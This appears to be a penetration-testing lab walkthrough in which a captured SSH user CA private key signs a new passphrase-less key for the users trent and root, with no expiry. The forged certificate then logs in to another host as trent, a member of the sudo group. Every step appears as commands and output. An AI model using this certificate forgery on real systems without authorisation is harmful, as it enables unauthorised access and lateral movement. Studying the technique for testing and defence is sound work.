# Abuse SSH User CA
## Generate Keypair

Generate a new SSH keypair:

```shell-session
root@linux-srv-03:/home/trent/user-ca# ssh-keygen -f attacker -N ''
Generating public/private ed25519 key pair.
Your identification has been saved in attacker
Your public key has been saved in attacker.pub
The key fingerprint is:
SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 root@linux-srv-03.nullbyte.internal
The key's randomart image is:
+--[ED25519 256]--+
|          ..BB.. |
|       .   +E.= .|
|  o . o =. . = o.|
|   * ..X*=.   . .|
|  o o +=S++      |
|   o o .o. .     |
|    . ..  . .    |
|        ..+=     |
|         o+o.    |
+----[SHA256]-----+
```

- The key is saved in the file `attacker`
- `-N ''` is used to not not protect the key with a passphrase

## Sign the Key

Sign the key with the SSH user CA private key:

```shell-session
root@linux-srv-03:/home/trent/user-ca# ssh-keygen -s user-ca -I something -n trent,root attacker.pub
Signed user key attacker-cert.pub: id "something" serial 0 for trent,root valid forever
```

- `-s` is used to specify the SSH user CA private key.
- `-I` is used to specify an identity which will be seen in the SSH server logs.
- `-n trent,root` is used to specify the users for which the key should be valid.
- `attacker.pub` is the public key that should be signed by the CA.
- `attacker-cert.pub` is the certificate (signed public key).

Display the certificate:

```shell-session
root@linux-srv-03:/home/trent/user-ca# cat attacker-cert.pub 
ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAIA9A9iq/LTA3ENKkckd9hxFnJEOqAc8znuxbOfHOoBQNAAAAIFck1fVqA50Bm8bukkD8MSWImcSA9dir+Lu9VhUaWUp+AAAAAAAAAAAAAAABAAAACXNvbWV0aGluZwAAABEAAAAFdHJlbnQAAAAEcm9vdAAAAAAAAAAA//////////8AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAAAAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCbg4GXctlkQqMACL4e8mAjXREabtE2zsPJ1yUX1baeNgAAAFMAAAALc3NoLWVkMjU1MTkAAABA3lzGHNrz0frkRebxP2x62Rh4+pkMzpRYg89EDjXueUsoS8H2AL7R1XkQBK66nfLeSSoprsdpAs3uDP/4hhsNDg== root@linux-srv-03.nullbyte.internal
```

Get details:

```
root@linux-srv-03:/home/trent/user-ca# ssh-keygen -L -f attacker-cert.pub 
attacker-cert.pub:
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Public key: ED25519-CERT SHA256:SypV+Pjx65Jy/t5YL1tuE0xhB3SQCF22UAqB2siJCsU
        Signing CA: ED25519 SHA256:Tjd72wG6HJCtWuKYUEi/Lcrd3b5vLaWhzQMTP39hQiY (using ssh-ed25519)
        Key ID: "something"
        Serial: 0
        Valid: forever
        Principals: 
                trent
                root
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
```

- The certificate is valid for  user `trent` and `root`

## Login on `linux-srv-04`

Try if the certificate can be used to login as `root` on `linux-srv-04`:

```shell-session
root@linux-srv-03:/home/trent/user-ca# ssh -v -i attacker root@linux-srv-04
[...]
debug1: Offering public key: attacker ED25519 SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
debug1: Authentications that can continue: publickey
debug1: Offering public key: attacker ED25519-CERT SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
debug1: Server accepts key: attacker ED25519-CERT SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
debug1: Authentications that can continue: publickey
root@linux-srv-04: Permission denied (publickey).
```

- First, the private key `attacker` is used for an authentication try. The key is rejected. This is because this newly generated key is not installed on the target system.
- Then, the certificate is used to for another try. The certificate is accepted but the `root` user is not allowed to login.

Try if the certificate can be used to login as `trent` on `linux-srv-04`:

```shell-session
root@linux-srv-03:/home/trent/user-ca# ssh -v -i attacker trent@linux-srv-04
[...]
debug1: Authentications that can continue: publickey
debug1: Next authentication method: publickey
debug1: Will attempt key: attacker ED25519 SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
debug1: Will attempt key: attacker ED25519-CERT SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
debug1: Offering public key: attacker ED25519 SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
debug1: Authentications that can continue: publickey
debug1: Offering public key: attacker ED25519-CERT SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
debug1: Server accepts key: attacker ED25519-CERT SHA256:StHOKPAOsXWP9WDbtluOPDZCHGMpd5XnXQATJtcjlC0 explicit
Authenticated to linux-srv-04 ([172.17.0.4]:22) using "publickey".
[...]

trent@linux-srv-04:~$ hostname
linux-srv-04.nullbyte.internal
trent@linux-srv-04:~$ id
uid=1001(trent) gid=1001(trent) groups=1001(trent),27(sudo)
```

- The certificate could be used to login as `trent` on `linux-srv-04`.